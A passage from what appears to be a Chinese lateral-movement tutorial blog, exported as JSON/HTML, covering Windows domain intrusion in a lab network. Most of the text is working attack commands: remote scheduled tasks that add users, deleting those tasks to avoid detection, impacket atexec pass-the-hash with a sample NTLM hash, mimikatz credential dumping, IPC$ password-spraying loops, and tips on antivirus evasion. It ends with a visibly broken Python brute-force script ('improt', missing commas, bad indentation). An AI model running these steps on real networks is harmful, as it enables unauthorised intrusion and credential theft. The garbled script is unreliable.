6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>copy add.bat \\\\192.168.3.32\\c$</code></p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627202728184.png\" alt=\"image-20220627202728184\"></p>\n<p>在SqlServer本地Administrator用户C盘查看：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627202806170.png\" alt=\"image-20220627202806170\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>创建 adduser 任务对应执行文件</p>\n<p><code>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\\add.bat /F</code></p>\n<p>创建一个以system权限的，名为adduser的，时间为每日任务（延时执行），执行文件c:\\add.bat的，计划任务</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627203001828.png\" alt=\"image-20220627203001828\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行命令：</p>\n<p><code>schtasks /run /s 192.168.3.32 /tn adduser /#运行 adduser 任务</code></p>\n<p><code>schtasks /delete /s 192.168.3.21 /tn adduser /#删除 adduser 任务</code></p>\n<p>（删除任务是为了防止管理员发现）</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627203030711.png\" alt=\"image-20220627203030711\"></p>\n<p>最后执行net user查看成功创建用户test1：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627203142301.png\" alt=\"image-20220627203142301\"></p>\n<h2 id=\"0x02-明文-HASH-传递-atexec-impacket\"><a href=\"#0x02-明文-HASH-传递-atexec-impacket\" class=\"headerlink\" title=\"0x02 明文 HASH 传递 atexec-impacket\"></a>0x02 明文 HASH 传递 atexec-impacket</h2><h3 id=\"0x00-impacket介绍\"><a href=\"#0x00-impacket介绍\" class=\"headerlink\" title=\"0x00 impacket介绍\"></a>0x00 impacket介绍</h3><p>1、一句话命令，连接、提权全部搞定。</p>\n<p>2、<strong>第三方工具，非微软官方工具，易被杀毒软件查杀，实战中需要做免杀。</strong></p>\n<p>3、atexec是Impacket网络协议工具包中的一个工具。</p>\n<p>4、Impacket工具包介绍：<a href=\"https://www.freebuf.com/sectool/175208.html\">https://www.freebuf.com/sectool/175208.html</a></p>\n<p>5、Impacket 是一个Python类库，用于对SMB1-3或IPv4 &#x2F; IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。  （对协议进行访问，可以改成exe文件）</p>\n<p>6、下载地址：<a href=\"https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip\">https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip</a> </p>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>尝试at命令的计划任务（2012版本以下）</p>\n<p>连接域控本地administrator（明文）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行命令：\n\natexec.exe .&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627205803678.png\" alt=\"image-20220627205803678\"></p>\n<p>连接administrator返回system权限。</p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>连接域控本地administrator（哈希）</p>\n<p>通过mimikatz获取到域控的哈希密码：（NTLM后面是哈希值）</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627211959969.png\" alt=\"image-20220627211959969\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行命令：\natexec.exe -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.21 &quot;whoami&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627212910913.png\" alt=\"image-20220627212910913\"></p>\n<p>##0x03 明文 HASH 传递批量利用</p>\n<h3 id=\"0x00-批量检测ip对应明文连接\"><a href=\"#0x00-批量检测ip对应明文连接\" class=\"headerlink\" title=\"0x00 批量检测ip对应明文连接\"></a>0x00 批量检测ip对应明文连接</h3><p>假设获取到了内网中的WebServer的权限，通过WebServer进行正常的横向渗透（实战中不知道域控密码）</p>\n<p>首先使用mimikatz获取webserver的用户名和密码：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627213532256.png\" alt=\"image-20220627213532256\"></p>\n<p>使用微软自带命令探寻网段的存活主机（自带内部命令推荐使用）</p>\n<p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>使用for循环，去ping,然后筛选出TTL &#x3D;的字段（发现：3.21（域控）；3.32（SQLserver）；）</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627214706119.png\" alt=\"image-20220627214706119\"></p>\n<p>将两个ip地址写入ips.txt（爆破脚本）</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627215019581.png\" alt=\"image-20220627215019581\"></p>\n<p>批量检测ip对应明文连接（for循环进行变量ip地址的ipc连接）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">FOR &#x2F;F %i in (ips.txt) do net use \\\\%i\\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>同一用户名和密码，去尝试ipc连接不同的ip地址</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627220411914.png\" alt=\"image-20220627220411914\"></p>\n<p>可以看到连接3.31成功，连接3.21提示已经被相同的用户连接。</p>\n<p>###0x01 批量检测 IP 对应明文回显版</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">FOR &#x2F;F %i in (ips.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里获取到system权限后，可以重复以上操作，通过mimikatz不断的获取本地的密码，进而去获取域内用户的权限。（这里atexec.exe容易被查杀，可以做免杀，也可以通过计划任务等等获取权限） </p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627221312045.png\" alt=\"image-20220627221312045\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627221258715.png\" alt=\"image-20220627221258715\"></p>\n<p>3.31的ip返回system。</p>\n<h3 id=\"0x02-批量检测明文对应\"><a href=\"#0x02-批量检测明文对应\" class=\"headerlink\" title=\"0x02 批量检测明文对应\"></a>0x02 批量检测明文对应</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">FOR &#x2F;F %i in (pass.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>流程：</p>\n<p>1.先获取系统权限</p>\n<p>2.将mimikatz复制到对方主机</p>\n<p>3.运行mimikatz获取明文或者哈希密码</p>\n<p>4.将获取到的密码添加到爆破字典 </p></blockquote>\n<h3 id=\"0x03-批量检测HASH对应\"><a href=\"#0x03-批量检测HASH对应\" class=\"headerlink\" title=\"0x03 批量检测HASH对应\"></a>0x03 批量检测HASH对应</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">FOR &#x2F;F %i in (hash.txt) do atexec.exe -hashes :%i .&#x2F;administrator@192.168.3.21 whoami <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x04-明文-HASH传递-批量利用-升级版\"><a href=\"#0x04-明文-HASH传递-批量利用-升级版\" class=\"headerlink\" title=\"0x04 明文-HASH传递 批量利用-升级版\"></a>0x04 明文-HASH传递 批量利用-升级版</h2><p>遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、安装pyinstall:\npip install pyinstall\n\n2、生成可执行EXE：\npyinstaller -F fuck_neiwang_001.py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">improt os<span class=\"token punctuation\">,</span>t\n\nips<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'192.168.3.25'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'192.168.3.29'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'192.168.3.30'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'192.168.3.21'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'192.168.3.31'</span>\n<span class=\"token punctuation\">&#125;</span>\n\nusers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'Administrator'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'dbamain'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'admin'</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">pass</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'admin'</span><span class=\"token punctuation\">.</span>\n    <span class=\"token string\">'admin123'</span>\n    <span class=\"token string\">'hacker'</span>\n    <span class=\"token string\">'hacker123'</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">for</span> ip <span class=\"token keyword\">in</span> ips<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> user <span class=\"token keyword\">in</span> users<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> mima <span class=\"token keyword\">in</span> <span class=\"token keyword\">pass</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">exec</span><span class=\"token operator\">=</span><span class=\"token string\">\"net use \\\\\"</span><span class=\"token operator\">+</span> <span class=\"token string\">\"\\\\\"</span> <span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">'ipc$'</span><span class=\"token operator\">+</span>mima<span class=\"token operator\">+</span><span class=\"token string\">'/user:test\\\\'</span><span class=\"token operator\">+</span>user\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--->'</span><span class=\"token operator\">+</span><span class=\"token keyword\">exec</span><span class=\"token operator\">+</span><span class=\"token string\">'&lt;---'</span><span class=\"token punctuation\">)</span>\n        os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token keyword\">exec</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":"0x00脑图： 0x01 明文传递 at&amp;schtasks###0x00 思路及流程 1、在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，可以横向渗透拿下更多的主机在已知目标系统的用户明文密码的基础上， 使用at&amp;schtasks 命令，直接可以在远程...","link":"","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92-at-amp-schtasks\"><span class=\"toc-text\">0x01 明文传递 at&amp;schtasks</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">0x01 利用流程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-IPC\"><span class=\"toc-text\">0x02 IPC</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%98%8E%E6%96%87-HASH-%E4%BC%A0%E9%80%92-atexec-impacket\"><span class=\"toc-text\">0x02 明文 HASH 传递 atexec-impacket</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-impacket%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 impacket介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8Bip%E5%AF%B9%E5%BA%94%E6%98%8E%E6%96%87%E8%BF%9E%E6%8E%A5\"><span class=\"toc-text\">0x00 批量检测ip对应明文连接</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E6%98%8E%E6%96%87%E5%AF%B9%E5%BA%94\"><span class=\"toc-text\">0x02 批量检测明文对应</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8BHASH%E5%AF%B9%E5%BA%94\"><span class=\"toc-text\">0x03 批量检测HASH对应</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E6%98%8E%E6%96%87-HASH%E4%BC%A0%E9%80%92-%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8-%E5%8D%87%E7%BA%A7%E7%89%88\"><span class=\"toc-text\">0x04 明文-HASH传递 批量利用-升级版</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网安全-域横向渗透【二】","uid":"3025b9eec92496f30bb6ae7638116cb8","slug":"内网安全-域横向渗透【二】","date":"2022-06-28T01:58:56.000Z","updated":"2022-06-28T08:53:25.956Z","comments":true,"path":"api/articles/内网安全-域横向渗透【二】.json","keywords":null,"cover":[],"text":"0x00 相关知识点0x001、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值； 2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码 解决方法： 1、利用...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 